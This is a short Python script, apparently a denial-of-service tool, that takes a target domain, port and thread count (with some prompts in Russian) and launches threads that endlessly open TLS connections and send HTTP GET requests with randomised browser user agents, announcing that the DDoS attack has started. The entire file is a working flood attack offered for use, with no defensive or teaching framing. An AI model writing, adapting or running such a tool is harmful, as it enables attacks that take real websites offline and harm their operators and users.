#python3/ddos
import random, socket, threading
import os, ssl

os.system("clear")

banner = """
 _____  ___   ____   _   _ ____  
|___ / / _ \ / ___| | \ | |  _ \ 
  |_ \| | | |\___ \ |  \| | | | |
 ___) | |_| | ___) || |\  | |_| |
|____/ \___(_)____(_)_| \_|____/ 
                                
"""

def random_agent():
	return f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:88.0) Gecko/{str(random.randint(10,9000000))} Firefox/88.0"

def ddos(port,host):
	while True:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		packet = f"GET / HTTP/1.1\nHost: {host}\nUser-Agent: {random_agent()}\n\n"
		context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock = context.wrap_socket(sock, server_hostname=host)
		sock.connect((host, port))
		sock.sendall(packet.encode())
		sock.close()

def start():
	print(banner)
	host = input("[DOMAIN]: ")
	ip = socket.gethostbyname(host)
	port = int(input(f"[IP]:{ip} [PORT]: "))
	maxthreads = input("[КОЛИЧЕСТВО ПОТОКОВ]: ")
	num = 0
	while num < int(maxthreads) :
	    num += 1
	    threading.Thread(target=ddos, args=(port,host)).start()

	print(f"DDoS Атака на сайт {host} пошла!")

if __name__ == '__main__':
	start()